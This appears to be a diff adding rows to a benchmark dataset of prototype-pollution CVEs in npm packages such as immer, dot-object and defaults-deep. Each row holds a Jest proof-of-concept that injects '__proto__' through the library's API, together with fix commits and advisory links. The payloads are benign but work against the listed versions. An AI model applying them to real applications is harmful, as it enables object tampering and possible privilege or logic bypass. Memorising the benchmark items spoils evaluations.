+prototype-pollution,CVE-2021-23436,immer,8.0.0,9.0.6,prototype-pollution/immer_8.0.0,"//https://snyk.io/vuln/SNYK-JS-IMMER-1019369
+test(""prototype pollution in immer"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const { applyPatches, enablePatches } = require(""immer"");
+  enablePatches();
+  applyPatches({}, [
+    { op: ""add"", path: [""__proto__"", ""polluted""], value: ""yes"" },
+  ]);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/immerjs/immer/commit/fa671e55ee9bd42ae08cc239102b665a23958237,src/plugins/patches.ts:245:16,https://security.snyk.io/vuln/SNYK-JS-IMMER-1540542; https://github.com/advisories/GHSA-33f9-j839-rf8h
+prototype-pollution,CVE-2019-10793,dot-object,2.1.2,2.1.3,prototype-pollution/dot-object_2.1.2,"//https://snyk.io/vuln/SNYK-JS-DOTOBJECT-548905
+test(""prototype pollution in dot-object "", () => {
+  var a = require(""dot-object"");
+  var obj = {};
+  var path = ""__proto__"";
+
+  expect({}.polluted).toBe(undefined);
+
+  var val = { polluted: ""yes"" };
+  a.set(path, val, {}, true);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/rhalff/dot-object/commit/f76cff5fe6d01d30ce110d8f454db2e5bd28a7de,index.js:415:25,https://security.snyk.io/vuln/SNYK-JS-DOTOBJECT-548905; 
+prototype-pollution,CVE-2020-7717,dot-notes,3.2.0,n/a,prototype-pollution/dot-notes_3.2.0,"//https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668
+test(""prototype pollution in dot-notes"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const dots = require(""dot-notes"");
+  dots.create({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/create.js:43:19,https://security.snyk.io/vuln/SNYK-JS-DOTNOTES-598668; https://github.com/advisories/GHSA-qr4m-jcvc-3382
+prototype-pollution,CVE-2020-7726,safe-object2,1.0.3,n/a,prototype-pollution/safe-object2_1.0.3,"//https://snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801
+test(""prototype pollution in safe-object2"", () => {
+  const safeObj2 = require(""safe-object2"");
+  const obj = safeObj2({});
+
+  expect({}.polluted).toBe(undefined);
+
+  obj.setter([""__proto__"", ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:1:1869,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJECT2-598801; https://github.com/advisories/GHSA-jpq3-xf27-5jf2
+prototype-pollution,CVE-2020-7703,nis-utils,0.6.10,n/a,prototype-pollution/nis-utils_0.6.10,"//https://snyk.io/vuln/SNYK-JS-NISUTILS-598799
+
+test(""prototype pollution in nis-utils"", () => {
+  const nisUtils = require(""nis-utils"");
+
+  const object1 = {};
+  expect({}.polluted).toBe(undefined);
+
+  nisUtils.object.setValue({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/object.js:166:40,https://security.snyk.io/vuln/SNYK-JS-NISUTILS-598799; https://github.com/advisories/GHSA-gr58-j5wh-m333
+prototype-pollution,CVE-2020-7723,promisehelpers,0.0.5,n/a,prototype-pollution/promisehelpers_0.0.5,"//https://snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686
+test(""prototype pollution in promisehelpers"", () => {
+  const promisehelpers = require(""promisehelpers"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  promisehelpers.insert([""__proto__"", ""polluted""], ""yes"")(obj);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/index.js:16:25,https://security.snyk.io/vuln/SNYK-JS-PROMISEHELPERS-598686; https://github.com/advisories/GHSA-rj5f-7c8x-gjg4
+prototype-pollution,CVE-2018-3723,defaults-deep,0.2.0,0.2.4,prototype-pollution/defaults-deep_0.2.0,"//https://hackerone.com/reports/310514
+test(""prototype pollution in defaults-deep "", () => {
+  const defaultsDeep = require(""defaults-deep"");
+  expect({}.polluted).toBe(undefined);
+
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  defaultsDeep({}, JSON.parse(malicious_payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/defaults-deep/commit/c873f341327ad885ff4d0f23b3d3bca31b0343e5,index.js:20:16,https://hackerone.com/reports/310514; https://security.snyk.io/vuln/npm:defaults-deep:20180215; https://github.com/advisories/GHSA-cqp5-m4pq-gfgp
+prototype-pollution,CVE-2020-7716,deeps,1.4.5,n/a,prototype-pollution/deeps_1.4.5,"//https://snyk.io/vuln/SNYK-JS-DEEPS-598667
+test(""prototype pollution in deeps"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const deeps = require(""deeps"");
+  deeps.set({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:226:94,https://security.snyk.io/vuln/SNYK-JS-DEEPS-598667; https://github.com/advisories/GHSA-rgfv-v3jh-7ffp
+prototype-pollution,CVE-2020-7618,sds,3.2.0,4.0.0,prototype-pollution/sds_3.2.0,"//https://snyk.io/vuln/SNYK-JS-SDS-564123
+test(""prototype pollution in sds"", () => {
+  const root = require(""sds"");
+
+  obj = {};
+  let payload = ""__proto__.polluted"";
+
+  expect({}.polluted).toBe(undefined);
+
+  root.set({}, payload, true);
+
+  expect({}.polluted).toBe(true);
+});
+",https://github.com/monsterkodi/sds/commit/a228f025fd1be033088b7abbc0f77118d573f216,js:34:13,https://security.snyk.io/vuln/SNYK-JS-SDS-564123; https://github.com/advisories/GHSA-cxm3-284p-qc4v
+prototype-pollution,CVE-2020-7706,connie,0.1.0,0.1.1,prototype-pollution/connie_0.1.0,"test(""prototype pollution in connie"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const connie = require(""connie"");
+  const fs = require(""fs"");
+  const path = require(""path"");
+  const pathToConfig = path.resolve(__dirname, ""./config.json"");
+
+  fs.writeFileSync(pathToConfig, `{""__proto__"": {""polluted"": ""yes""}}`);
+  connie(""file"", pathToConfig)
+    .read()
+    .then(() => {
+      expect({}.polluted).toBe(""yes"");
+      fs.unlinkSync(pathToConfig);
+    });
+});
+",https://github.com/mattinsler/connie-lang/commit/ef376d404c712dd28309ba07f28a8f87f24a015a,lib/connie-lang.js:43:28,https://security.snyk.io/vuln/SNYK-JS-CONNIELANG-598853; https://github.com/advisories/GHSA-8vv3-jxm8-f4vf
